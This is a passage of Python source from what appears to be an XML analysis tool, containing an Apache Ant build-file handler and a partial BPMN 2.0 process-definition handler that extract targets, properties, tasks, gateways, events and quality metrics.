import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class AntBuildHandler(XMLHandler):
    """Handler for Apache Ant build.xml files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for Ant project root element
        if root.tag == 'project' or root.tag.endswith('}project'):
            confidence = 0.0
            
            # Strong indicators for Ant build files
            if root.get('name') is not None:
                confidence += 0.3
            if root.get('default') is not None:
                confidence += 0.3
            if root.get('basedir') is not None:
                confidence += 0.2
            
            # Check for typical Ant elements
            ant_elements = ['target', 'property', 'taskdef', 'path', 'fileset']
            found_elements = sum(1 for elem in ant_elements if root.find(f'.//{elem}') is not None)
            confidence += min(found_elements * 0.1, 0.4)
            
            # Check for Ant-specific namespaces or attributes
            if any('antlib' in str(uri) for uri in namespaces.values()):
                confidence += 0.2
            
            # If we have decent confidence, it's likely an Ant build file
            if confidence >= 0.5:
                return True, min(confidence, 1.0)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        project_name = root.get('name', 'unknown')
        default_target = root.get('default', 'none')
        
        # Try to determine Ant version from comments or attributes
        version = None
        
        # Look for version information in comments
        if hasattr(root, 'iter'):
            for elem in root.iter():
                if elem.tag is ET.Comment:
                    comment_text = str(elem)
                    version_match = re.search(r'ant[^\d]*(\d+\.\d+(?:\.\d+)?)', comment_text, re.IGNORECASE)
                    if version_match:
                        version = version_match.group(1)
                        break
        
        metadata = {
            "build_tool": "Apache Ant",
            "category": "build_configuration",
            "project_name": project_name,
            "default_target": default_target
        }
        
        # Check for Ivy integration
        if any('ivy' in str(uri) for uri in namespaces.values()):
            metadata["dependency_manager"] = "Apache Ivy"
        
        return DocumentTypeInfo(
            type_name="Apache Ant Build",
            confidence=0.95,
            version=version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'project_info': self._extract_project_info(root),
            'targets': self._analyze_targets(root),
            'properties': self._extract_properties(root),
            'paths': self._analyze_paths(root), 
            'filesets': self._analyze_filesets(root),
            'dependencies': self._analyze_dependencies(root),
            'tasks': self._analyze_tasks(root),
            'build_metrics': self._calculate_build_metrics(root)
        }
        
        recommendations = [
            "Analyze target dependencies for build optimization",
            "Check for hardcoded paths and credentials",
            "Extract for CI/CD pipeline configuration",
            "Review build performance and parallelization opportunities",
            "Validate property management and externalization",
            "Assess dependency management strategy"
        ]
        
        ai_use_cases = [
            "Build optimization recommendations",
            "CI/CD pipeline generation",
            "Dependency vulnerability scanning", 
            "Build performance analysis",
            "Configuration management automation",
            "Technical debt assessment",
            "Build reproducibility analysis",
            "Security scanning of build scripts"
        ]
        
        data_inventory = {
            'targets': len(findings['targets']),
            'properties': len(findings['properties']),
            'paths': len(findings['paths']),
            'filesets': len(findings['filesets']),
            'dependencies': findings['dependencies']['total_count'],
            'tasks': findings['tasks']['total_count']
        }
        
        return SpecializedAnalysis(
            document_type="Apache Ant Build",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_build_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'project_metadata': {
                'name': root.get('name'),
                'default_target': root.get('default'),
                'base_directory': root.get('basedir', '.')
            },
            'build_targets': self._extract_target_list(root),
            'build_properties': self._extract_property_summary(root),
            'dependency_info': self._extract_dependency_summary(root),
            'task_summary': self._extract_task_summary(root)
        }
    
    def _extract_project_info(self, root: ET.Element) -> Dict[str, Any]:
        project_info = {
            'name': root.get('name'),
            'default_target': root.get('default'),
            'base_directory': root.get('basedir', '.'),
            'description': None
        }
        
        # Extract description
        description = root.find('.//description')
        if description is not None and description.text:
            project_info['description'] = description.text.strip()
        
        return project_info
    
    def _analyze_targets(self, root: ET.Element) -> List[Dict[str, Any]]:
        targets = []
        
        for target in root.findall('.//target'):
            target_info = {
                'name': target.get('name'),
                'depends': target.get('depends', '').split(',') if target.get('depends') else [],
                'if': target.get('if'),
                'unless': target.get('unless'),
                'description': target.get('description'),
                'task_count': len([child for child in target if child.tag != 'description']),
                'tasks': []
            }
            
            # Extract tasks within this target
            for task in target:
                if task.tag not in ['description']:
                    target_info['tasks'].append({
                        'name': task.tag,
                        'attributes': dict(task.attrib)
                    })
            
            targets.append(target_info)
        
        return targets
    
    def _extract_properties(self, root: ET.Element) -> Dict[str, Any]:
        properties = {
            'inline_properties': {},
            'property_files': [],
            'environment_properties': []
        }
        
        for prop in root.findall('.//property'):
            name = prop.get('name')
            value = prop.get('value')
            file_attr = prop.get('file')
            environment = prop.get('environment')
            
            if name and value:
                properties['inline_properties'][name] = value
            elif file_attr:
                properties['property_files'].append(file_attr)
            elif environment:
                properties['environment_properties'].append(environment)
        
        return properties
    
    def _analyze_paths(self, root: ET.Element) -> List[Dict[str, Any]]:
        paths = []
        
        for path in root.findall('.//path'):
            path_info = {
                'id': path.get('id'),
                'elements': []
            }
            
            # Analyze path elements
            for elem in path:
                if elem.tag == 'pathelement':
                    path_info['elements'].append({
                        'type': 'path_element',
                        'location': elem.get('location'),
                        'path': elem.get('path')
                    })
                elif elem.tag == 'fileset':
                    path_info['elements'].append({
                        'type': 'fileset',
                        'dir': elem.get('dir'),
                        'includes': elem.get('includes'),
                        'excludes': elem.get('excludes')
                    })
            
            paths.append(path_info)
        
        return paths
    
    def _analyze_filesets(self, root: ET.Element) -> List[Dict[str, Any]]:
        filesets = []
        
        for fileset in root.findall('.//fileset'):
            fileset_info = {
                'dir': fileset.get('dir'),
                'includes': fileset.get('includes'),
                'excludes': fileset.get('excludes'),
                'id': fileset.get('id'),
                'patterns': []
            }
            
            # Extract include/exclude patterns
            for include in fileset.findall('.//include'):
                if include.get('name'):
                    fileset_info['patterns'].append({
                        'type': 'include',
                        'pattern': include.get('name')
                    })
            
            for exclude in fileset.findall('.//exclude'):
                if exclude.get('name'):
                    fileset_info['patterns'].append({
                        'type': 'exclude', 
                        'pattern': exclude.get('name')
                    })
            
            filesets.append(fileset_info)
        
        return filesets
    
    def _analyze_dependencies(self, root: ET.Element) -> Dict[str, Any]:
        dependencies = {
            'ivy_dependencies': [],
            'jar_references': [],
            'lib_directories': [],
            'total_count': 0
        }
        
        # Check for Ivy dependencies
        for dep in root.findall('.//*[@org][@name]'):
            if 'ivy' in dep.tag:
                dep_info = {
                    'org': dep.get('org'),
                    'name': dep.get('name'),
                    'rev': dep.get('rev'),
                    'conf': dep.get('conf')
                }
                dependencies['ivy_dependencies'].append(dep_info)
                dependencies['total_count'] += 1
        
        # Check for JAR file references
        for elem in root.iter():
            for attr_name, attr_value in elem.attrib.items():
                if attr_value and '.jar' in attr_value:
                    dependencies['jar_references'].append({
                        'element': elem.tag,
                        'attribute': attr_name,
                        'jar_path': attr_value
                    })
                    dependencies['total_count'] += 1
        
        # Check for lib directories
        for elem in root.iter():
            for attr_name, attr_value in elem.attrib.items():
                if attr_value and ('lib' in attr_value.lower() or 'libs' in attr_value.lower()):
                    if attr_value not in [d['path'] for d in dependencies['lib_directories']]:
                        dependencies['lib_directories'].append({
                            'path': attr_value,
                            'context': elem.tag
                        })
        
        return dependencies
    
    def _analyze_tasks(self, root: ET.Element) -> Dict[str, Any]:
        task_summary = {
            'total_count': 0,
            'by_type': {},
            'custom_tasks': [],
            'deprecated_tasks': []
        }
        
        # Common Ant tasks
        common_tasks = [
            'javac', 'jar', 'copy', 'delete', 'mkdir', 'echo', 'exec',
            'zip', 'war', 'tar', 'replace', 'concat', 'sql', 'junit',
            'java', 'ant', 'subant', 'parallel', 'sequential'
        ]
        
        deprecated_tasks = ['style', 'mail']  # Known deprecated Ant tasks
        
        # Count all task elements
        for target in root.findall('.//target'):
            for task in target:
                if task.tag not in ['description']:
                    task_name = task.tag
                    task_summary['total_count'] += 1
                    task_summary['by_type'][task_name] = task_summary['by_type'].get(task_name, 0) + 1
                    
                    # Check for custom tasks (not in common list)
                    if task_name not in common_tasks and task_name not in [t['name'] for t in task_summary['custom_tasks']]:
                        task_summary['custom_tasks'].append({
                            'name': task_name,
                            'count': 1
                        })
                    
                    # Check for deprecated tasks
                    if task_name in deprecated_tasks:
                        task_summary['deprecated_tasks'].append(task_name)
        
        return task_summary
    
    def _calculate_build_metrics(self, root: ET.Element) -> Dict[str, Any]:
        metrics = {
            'complexity_score': 0.0,
            'target_count': len(root.findall('.//target')),
            'dependency_depth': 0,
            'property_count': len(root.findall('.//property')),
            'conditional_targets': 0
        }
        
        # Calculate dependency depth
        targets = root.findall('.//target')
        max_depth = 0
        for target in targets:
            depends = target.get('depends', '')
            if depends:
                depth = len(depends.split(','))
                max_depth = max(max_depth, depth)
        metrics['dependency_depth'] = max_depth
        
        # Count conditional targets
        for target in targets:
            if target.get('if') or target.get('unless'):
                metrics['conditional_targets'] += 1
        
        # Calculate complexity score
        complexity_factors = [
            min(metrics['target_count'] / 20, 1.0) * 0.3,
            min(metrics['dependency_depth'] / 5, 1.0) * 0.3,
            min(metrics['property_count'] / 50, 1.0) * 0.2,
            min(metrics['conditional_targets'] / 10, 1.0) * 0.2
        ]
        metrics['complexity_score'] = sum(complexity_factors)
        
        return metrics
    
    def _extract_target_list(self, root: ET.Element) -> List[Dict[str, str]]:
        targets = []
        for target in root.findall('.//target')[:10]:  # Limit to first 10
            targets.append({
                'name': target.get('name', ''),
                'description': target.get('description', ''),
                'depends': target.get('depends', '')
            })
        return targets
    
    def _extract_property_summary(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'total_properties': len(root.findall('.//property')),
            'property_files': [p.get('file') for p in root.findall('.//property[@file]') if p.get('file')],
            'sample_properties': {p.get('name'): p.get('value') for p in root.findall('.//property[@name][@value]')[:5]}
        }
    
    def _extract_dependency_summary(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'has_ivy': any('ivy' in str(uri) for uri in [elem.tag for elem in root.iter()]),
            'jar_count': len([attr for elem in root.iter() for attr in elem.attrib.values() if '.jar' in str(attr)]),
            'lib_dirs': list(set([attr for elem in root.iter() for attr in elem.attrib.values() 
                                if 'lib' in str(attr).lower() and len(str(attr)) < 100]))[:5]
        }
    
    def _extract_task_summary(self, root: ET.Element) -> Dict[str, Any]:
        tasks = {}
        for target in root.findall('.//target'):
            for task in target:
                if task.tag != 'description':
                    tasks[task.tag] = tasks.get(task.tag, 0) + 1
        
        return {
            'total_tasks': sum(tasks.values()),
            'unique_task_types': len(tasks),
            'most_common_tasks': sorted(tasks.items(), key=lambda x: x[1], reverse=True)[:5]
        }
    
    def _assess_build_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess build script quality"""
        
        # Complexity management (lower complexity is better)
        complexity_score = min(findings['build_metrics']['complexity_score'], 1.0)
        complexity_quality = max(0, 1.0 - complexity_score)
        
        # Documentation completeness
        total_targets = len(findings['targets'])
        documented_targets = sum(1 for t in findings['targets'] if t.get('description'))
        documentation_quality = documented_targets / total_targets if total_targets > 0 else 0
        
        # Property management
        inline_props = len(findings['properties']['inline_properties'])
        external_props = len(findings['properties']['property_files'])
        if inline_props + external_props > 0:
            externalization_ratio = external_props / (inline_props + external_props)
        else:
            externalization_ratio = 1.0
        
        # Dependency management
        dependency_quality = 0.5  # Default neutral score
        if findings['dependencies']['total_count'] > 0:
            ivy_ratio = len(findings['dependencies']['ivy_dependencies']) / findings['dependencies']['total_count']
            dependency_quality = ivy_ratio * 0.5 + 0.5  # Ivy usage is better
        
        # Best practices
        best_practices = 0.0
        project_info = findings['project_info']
        
        # Has project description
        if project_info.get('description'):
            best_practices += 0.25
        
        # Uses default target
        if project_info.get('default_target'):
            best_practices += 0.25
        
        # Has reasonable number of targets (not too few, not too many)
        target_count = len(findings['targets'])
        if 3 <= target_count <= 20:
            best_practices += 0.25
        
        # Uses properties for configuration
        if len(findings['properties']['property_files']) > 0:
            best_practices += 0.25
        
        return {
            "complexity_management": complexity_quality,
            "documentation": documentation_quality,
            "property_externalization": externalization_ratio,
            "dependency_management": dependency_quality,
            "best_practices": best_practices,
            "overall": (complexity_quality + documentation_quality + externalization_ratio + dependency_quality + best_practices) / 5
        }
</file>

<file path="src/handlers/bpmn_handler.py">
#!/usr/bin/env python3
"""
BPMN (Business Process Model and Notation) Handler

Analyzes BPMN 2.0 XML files to extract process definitions,
activities, gateways, events, and flows for process mining
and optimization.

FIXED VERSION: Replaced all local-name() XPath usage with ElementTree-compatible methods.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class BPMNHandler(XMLHandler):
    """Handler for BPMN 2.0 process definition files"""
    
    def _find_elements_by_local_name(self, root: ET.Element, local_name: str) -> List[ET.Element]:
        """Find elements by local name, ignoring namespace prefixes"""
        elements = []
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if tag == local_name:
                elements.append(elem)
        return elements
    
    def _find_element_by_local_name(self, root: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find first element by local name, ignoring namespace prefixes"""
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if tag == local_name:
                return elem
        return None
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for BPMN namespace
        if any('bpmn' in uri.lower() or 'omg.org/spec/BPMN' in uri for uri in namespaces.values()):
            return True, 1.0
        
        # Check for BPMN root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag == 'definitions':
            # Check for BPMN elements using namespace-aware search
            bpmn_elements = ['process', 'startEvent', 'endEvent', 'task', 'gateway']
            found = sum(1 for elem in bpmn_elements if self._find_elements_by_local_name(root, elem))
            if found >= 2:
                return True, min(found * 0.2, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Extract BPMN version
        version = "2.0"  # Default
        for uri in namespaces.values():
            if 'BPMN/2' in uri:
                version = "2.0"
            elif 'BPMN/1' in uri:
                version = "1.2"
        
        # Check if it's executable
        executable = root.get('isExecutable', 'false') == 'true'
        
        return DocumentTypeInfo(
            type_name="BPMN Process Definition",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "OMG BPMN",
                "category": "business_process",
                "executable": executable
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'processes': self._analyze_processes(root),
            'activities': self._analyze_activities(root),
            'gateways': self._analyze_gateways(root),
            'events': self._analyze_events(root),
            'flows': self._analyze_flows(root),
            'lanes': self._analyze_lanes(root),
            'data_objects': self._analyze_data_objects(root),
            'complexity_metrics': self._calculate_complexity_metrics(root)
        }
        
        recommendations = [
            "Analyze process bottlenecks and optimization opportunities",
            "Generate process documentation and training materials",
            "Validate against BPMN best practices",
            "Extract for process mining and analytics",
            "Monitor process execution patterns",
            "Identify automation candidates"
        ]
        
        ai_use_cases = [
            "Process optimization recommendations",
            "Bottleneck detection and analysis",
            "Process mining and discovery",
            "Compliance checking",
            "Resource allocation optimization",
            "Process simulation",
            "Automated documentation generation",
            "Process variant analysis"
        ]
        
        return SpecializedAnalysis(
            document_type="BPMN Process Definition",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'processes': len(findings['processes']),
                'activities': findings['activities']['total'],
                'gateways': findings['gateways']['total'],
                'events': findings['events']['total'],
                'flows': len(findings['flows'])
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_process_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'process_hierarchy': self._extract_process_hierarchy(root),
            'activity_sequences': self._extract_activity_sequences(root),
            'decision_points': self._extract_decision_points(root),
            'resource_assignments': self._extract_resource_assignments(root),
            'process_metrics': self._extract_process_metrics(root)
        }
    
    def _analyze_processes(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze process definitions"""
        processes = []
        
        for process in self._find_elements_by_local_name(root, 'process'):
            process_info = {
                'id': process.get('id'),
                'name': process.get('name'),
                'is_executable': process.get('isExecutable', 'false') == 'true',
                'process_type': process.get('processType', 'None'),
                'is_closed': process.get('isClosed', 'false') == 'true',
                'elements': {
                    'activities': len(self._find_elements_by_local_name(process, 'task') + 
                                    self._find_elements_by_local_name(process, 'subProcess') +
                                    self._find_elements_by_local_name(process, 'callActivity')),
                    'gateways': len(self._find_elements_by_local_name(process, 'exclusiveGateway') +
                                   self._find_elements_by_local_name(process, 'parallelGateway') +
                                   self._find_elements_by_local_name(process, 'inclusiveGateway') +
                                   self._find_elements_by_local_name(process, 'eventBasedGateway')),
                    'events': len(self._find_elements_by_local_name(process, 'startEvent') +
                                 self._find_elements_by_local_name(process, 'endEvent') +
                                 self._find_elements_by_local_name(process, 'intermediateThrowEvent') +
                                 self._find_elements_by_local_name(process, 'intermediateCatchEvent'))
                }
            }
            
            # Extract documentation
            doc = self._find_element_by_local_name(process, 'documentation')
            if doc is not None and doc.text:
                process_info['documentation'] = doc.text.strip()
            
            processes.append(process_info)
        
        return processes
    
    def _analyze_activities(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze all activities (tasks, subprocesses, etc.)"""
        activities = {
            'total': 0,
            'by_type': {},
            'manual_tasks': [],
            'service_tasks': [],
            'user_tasks': [],
            'script_tasks': [],
            'subprocesses': [],
            'call_activities': []
        }
        
        # Analyze different task types
        task_types = [
            ('task', 'generic'),
            ('userTask', 'user'),
            ('serviceTask', 'service'),
            ('scriptTask', 'script'),
            ('manualTask', 'manual'),
            ('businessRuleTask', 'business_rule'),
            ('sendTask', 'send'),
            ('receiveTask', 'receive')
        ]
        
        for task_elem, task_type in task_types:
            tasks = self._find_elements_by_local_name(root, task_elem)
            activities['by_type'][task_type] = len(tasks)
            activities['total'] += len(tasks)
            
            # Store specific task details
            for task in tasks:
                task_info = {
                    'id': task.get('id'),
                    'name': task.get('name'),
                    'type': task_type
                }
                
                if task_type == 'user':
                    activities['user_tasks'].append(task_info)
                elif task_type == 'service':
                    activities['service_tasks'].append(task_info)
                elif task_type == 'script':
                    activities['script_tasks'].append(task_info)
                elif task_type == 'manual':
                    activities['manual_tasks'].append(task_info)
        
        # Analyze subprocesses
        for subprocess in self._find_elements_by_local_name(root, 'subProcess'):
            subprocess_info = {
                'id': subprocess.get('id'),
                'name': subprocess.get('name'),
                'triggered_by_event': subprocess.get('triggeredByEvent', 'false') == 'true',
                'is_expanded': subprocess.get('isExpanded', 'true') == 'true',
                'child_activities': len(self._find_elements_by_local_name(subprocess, 'task'))
            }
            activities['subprocesses'].append(subprocess_info)
            activities['total'] += 1
        
        # Analyze call activities
        for call_activity in self._find_elements_by_local_name(root, 'callActivity'):
            call_info = {
                'id': call_activity.get('id'),
                'name': call_activity.get('name'),
                'called_element': call_activity.get('calledElement')
            }
            activities['call_activities'].append(call_info)
            activities['total'] += 1
        
        return activities
    
    def _analyze_gateways(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze gateways (decision points)"""
        gateways = {
            'total': 0,
            'exclusive': [],
            'parallel': [],
            'inclusive': [],
            'event_based': [],
            'complex': []
        }
        
        gateway_types = [
            ('exclusiveGateway', 'exclusive'),
            ('parallelGateway', 'parallel'),
            ('inclusiveGateway', 'inclusive'),
            ('eventBasedGateway', 'event_based'),
            ('complexGateway', 'complex')
        ]
        
        for gateway_elem, gateway_type in gateway_types:
            for gateway in self._find_elements_by_local_name(root, gateway_elem):
                gateway_info = {
                    'id': gateway.get('id'),
                    'name': gateway.get('name'),
                    'gateway_direction': gateway.get('gatewayDirection', 'Unspecified'),
                    'incoming_flows': len(self._find_elements_by_local_name(gateway, 'incoming')),
                    'outgoing_flows': len(self._find_elements_by_local_name(gateway, 'outgoing'))
                }
                
                gateways[gateway_type].append(gateway_info)
                gateways['total'] += 1
        
        return gateways
    
    def _analyze_events(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze events (start, end, intermediate)"""
        events = {
            'total': 0,
            'start_events': [],
            'end_events': [],
            'intermediate_throw': [],
            'intermediate_catch': [],
            'boundary_events': []
        }
        
        # Start events
        for event in self._find_elements_by_local_name(root, 'startEvent'):
            event_info = {
                'id': event.get('id'),
                'name': event.get('name'),
                'is_interrupting': event.get('isInterrupting', 'true') == 'true',
                'event_type': self._determine_event_type(event)
            }
            events['start_events'].append(event_info)
            events['total'] += 1
        
        # End events
        for event in self._find_elements_by_local_name(root, 'endEvent'):
            event_info = {
                'id': event.get('id'),
                'name': event.get('name'),
                'event_type': self._determine_event_type(event)
            }
            events['end_events'].append(event_info)
            events['total'] += 1
        
        # Intermediate throw events
        for event in self._find_elements_by_local_name(root, 'intermediateThrowEvent'):
            event_info = {
                'id': event.get('id'),
                'name': event.get('name'),
                'event_type': self._determine_event_type(event)
            }
            events['intermediate_throw'].append(event_info)
            events['total'] += 1
        
        # Intermediate catch events
        for event in self._find_elements_by_local_name(root, 'intermediateCatchEvent'):
            event_info = {
                'id': event.get('id'),
                'name': event.get('name'),
                'event_type': self._determine_event_type(event)
            }
            events['intermediate_catch'].append(event_info)
            events['total'] += 1
        
        # Boundary events
        for event in self._find_elements_by_local_name(root, 'boundaryEvent'):
            event_info = {
                'id': event.get('id'),
                'name': event.get('name'),
                'attached_to': event.get('attachedToRef'),
                'cancel_activity': event.get('cancelActivity', 'true') == 'true',
                'event_type': self._determine_event_type(event)
            }
            events['boundary_events'].append(event_info)
            events['total'] += 1
        
        return events
    
    def _determine_event_type(self, event: ET.Element) -> str:
        """Determine the specific type of event"""
        event_types = [
            'messageEventDefinition', 'timerEventDefinition', 'errorEventDefinition',
            'signalEventDefinition', 'compensateEventDefinition', 'conditionalEventDefinition',
            'escalationEventDefinition', 'linkEventDefinition', 'terminateEventDefinition'
        ]
        
        for event_type in event_types:
            if self._find_element_by_local_name(event, event_type) is not None:
                return event_type.replace('EventDefinition', '').lower()
        
        return 'none'
    
    def _analyze_flows(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze sequence flows"""
        flows = []
        
        for flow in self._find_elements_by_local_name(root, 'sequenceFlow'):
            flow_info = {
                'id': flow.get('id'),
                'name': flow.get('name'),
                'source': flow.get('sourceRef'),
                'target': flow.get('targetRef'),
                'is_default': self._is_default_flow(root, flow),
                'condition': None
            }
            
            # Extract condition expression
            condition = self._find_element_by_local_name(flow, 'conditionExpression')
            if condition is not None and condition.text:
                flow_info['condition'] = condition.text.strip()
            
            flows.append(flow_info)
        
        return flows
    
    def _is_default_flow(self, root: ET.Element, flow: ET.Element) -> bool:
        """Check if a flow is marked as default"""
        flow_id = flow.get('id')
        
        # Check gateways for default flow references
        for elem in root.iter():
            if elem.get('default') == flow_id:
                return True
        
        return False
    
    def _analyze_lanes(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze lanes and pools (organizational units)"""
        lanes = []
        
        for lane in self._find_elements_by_local_name(root, 'lane'):
            lane_info = {
                'id': lane.get('id'),
                'name': lane.get('name'),
                'flow_node_refs': []
            }
            
            # Get referenced flow nodes
            for ref in self._find_elements_by_local_name(lane, 'flowNodeRef'):
                if ref.text:
                    lane_info['flow_node_refs'].append(ref.text)
            
            lanes.append(lane_info)
        
        return lanes
    
    def _analyze_data_objects(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze data objects and data stores"""
        data_objects = []
        
        # Data objects
        for data_obj in self._find_elements_by_local_name(root, 'dataObject'):
            data_objects.append({
                'id': data_obj.get('id'),
                'name': data_obj.get('name'),
                'type': 'data_object',
                'is_collection': data_obj.get('isCollection', 'false') == 'true'
            })
        
        # Data object references
        for data_ref in self._find_elements_by_local_name(root, 'dataObjectReference'):
            data_objects.append({
                'id': data_ref.get('id'),
                'name': data_ref.get('name'),
                'type': 'data_object_reference',
                'data_object_ref': data_ref.get('dataObjectRef')
            })
        
        # Data stores
        for data_store in self._find_elements_by_local_name(root, 'dataStore'):
            data_objects.append({
                'id': data_store.get('id'),
                'name': data_store.get('name'),
                'type': 'data_store',
                'capacity': data_store.get('capacity'),
                'is_unlimited': data_store.get('isUnlimited', 'false') == 'true'
            })
        
        return data_objects
    
    def _calculate_complexity_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate process complexity metrics"""
        total_activities = len(self._find_elements_by_local_name(root, 'task'))
        total_gateways = (len(self._find_elements_by_local_name(root, 'exclusiveGateway')) +
                         len(self._find_elements_by_local_name(root, 'parallelGateway')) +
                         len(self._find_elements_by_local_name(root, 'inclusiveGateway')))
        total_events = (len(self._find_elements_by_local_name(root, 'startEvent')) +
                       len(self._find_elements_by_local_name(root, 'endEvent')))
        total_flows = len(self._find_elements_by_local_name(root, 'sequenceFlow'))
        
        # Calculate metrics
        metrics = {
            'cyclomatic_complexity': total_gateways + 1,  # Simplified McCabe complexity
            'activity_complexity': total_activities,
            'control_flow_complexity': total_gateways * 2 + total_events,
            'size_metrics': {
                'total_elements': total_activities + total_gateways + total_events,
                'total_flows': total_flows
            },
            'complexity_score': 0.0
        }
        
        # Calculate overall complexity score (0-1)
        if metrics['size_metrics']['total_elements'] > 0:
            complexity_factors = [
                min(metrics['cyclomatic_complexity'] / 10, 1.0) * 0.4,
                min(metrics['activity_complexity'] / 30, 1.0) * 0.3,
                min(metrics['control_flow_complexity'] / 20, 1.0) * 0.3
            ]
            metrics['complexity_score'] = sum(complexity_factors)
        
        return metrics
    
    def _extract_process_hierarchy(self, root: ET.Element) -> Dict[str, Any]:
        """Extract process hierarchy and relationships"""
        hierarchy = {}
        
        for process in self._find_elements_by_local_name(root, 'process'):
            process_id = process.get('id')
            hierarchy[process_id] = {
                'name': process.get('name'),
                'subprocesses': [],
                'call_activities': []
            }
            
            # Find subprocesses
            for subprocess in self._find_elements_by_local_name(process, 'subProcess'):
                hierarchy[process_id]['subprocesses'].append({
                    'id': subprocess.get('id'),
                    'name': subprocess.get('name')
                })
            
            # Find call activities
            for call_activity in self._find_elements_by_local_name(process, 'callActivity'):
                hierarchy[process_id]['call_activities'].append({
                    'id': call_activity.get('id'),
                    'name': call_activity.get('name'),
                    'called_element': call_activity.get('calledElement')
                })
        
        return hierarchy
    
    def _extract_activity_sequences(self, root: ET.Element) -> List[List[str]]:
        """Extract common activity sequences"""
        sequences = []
        
        # Build flow graph
        flow_graph = {}
        for flow in self._find_elements_by_local_name(root, 'sequenceFlow'):
            source = flow.get('sourceRef')
            target = flow.get('targetRef')
            if source not in flow_graph:
                flow_graph[source] = []
            flow_graph[source].append(target)
        
        # Find paths from start to end events
        start_events = [e.get('id') for e in self._find_elements_by_local_name(root, 'startEvent')]
        end_events = [e.get('id') for e in self._find_elements_by_local_name(root, 'endEvent')]
        
        # Simple path extraction (limited to prevent explosion)
        for start in start_events[:3]:  # Limit starts
            paths = self._find_paths(flow_graph, start, end_events, max_paths=5)
            sequences.extend(paths)
        
        return sequences[:10]  # Limit total sequences
    
    def _find_paths(self, graph: Dict[str, List[str]], start: str, ends: List[str], 
                   max_paths: int = 5) -> List[List[str]]:
        """Find paths in graph (simplified DFS)"""
        paths = []
        
        def dfs(node: str, path: List[str], visited: set):
            if len(paths) >= max_paths:
                return
            
            if node in ends:
                paths.append(path + [node])
                return
            
            if node in visited or len(path) > 20:  # Prevent infinite loops
                return
            
            visited.add(node)
            
            if node in graph:
                for next_node in graph[node]:
                    dfs(next_node, path + [node], visited.copy())
        
        dfs(start, [], set())
        return paths
    
    def _extract_decision_points(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract decision points and their conditions"""
        decision_points = []
        
        # Exclusive gateways with conditions
        for gateway in self._find_elements_by_local_name(root, 'exclusiveGateway'):
            gateway_id = gateway.get('id')
            decision = {
                'id': gateway_id,
                'name': gateway.get('name'),
                'type': 'exclusive',
                'conditions': []
            }
            
            # Find outgoing flows with conditions
            for flow in self._find_elements_by_local_name(root, 'sequenceFlow'):
                if flow.get('sourceRef') == gateway_id:
                    condition = self._find_element_by_local_name(flow, 'conditionExpression')
                    if condition is not None and condition.text:
                        decision['conditions'].append({
                            'flow_id': flow.get('id'),
                            'target': flow.get('targetRef'),
                            'condition': condition.text.strip()
                        })
            
            if decision['conditions']:
                decision_points.append(decision)
        
        return decision_points[:10]  # Limit
    
    def _extract_resource_assignments(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract resource assignments from lanes and tasks"""
        assignments = []
        
        # From lanes
        for lane in self._find_elements_by_local_name(root, 'lane'):
            lane_name = lane.get('name')
            for ref in self._find_elements_by_local_name(lane, 'flowNodeRef'):
                if ref.text:
                    assignments.append({
                        'resource': lane_name,
                        'activity': ref.text,
                        'type': 'lane_assignment'
                    })
        
        # From user tasks with assignments
        for task in self._find_elements_by_local_name(root, 'userTask'):
            # Check for resource role
            resource_role = self._find_element_by_local_name(task, 'resourceRole')
            if resource_role is not None:
                resource_ref = self._find_element_by_local_name(resource_role, 'resourceRef')
                if resource_ref is not None and resource_ref.text:
                    assignments.append({
                        'resource': resource_ref.text,
                        'activity': task.get('id'),
                        'type': 'resource_role'
                    })
            
            # Check for performers
            performer = self._find_element_by_local_name(task, 'performer')
            if performer is not None:
                resource_ref = self._find_element_by_local_name(performer, 'resourceRef')
                if resource_ref is not None and resource_ref.text:
                    assignments.append({
                        'resource': resource_ref.text,
                        'activity': task.get('id'),
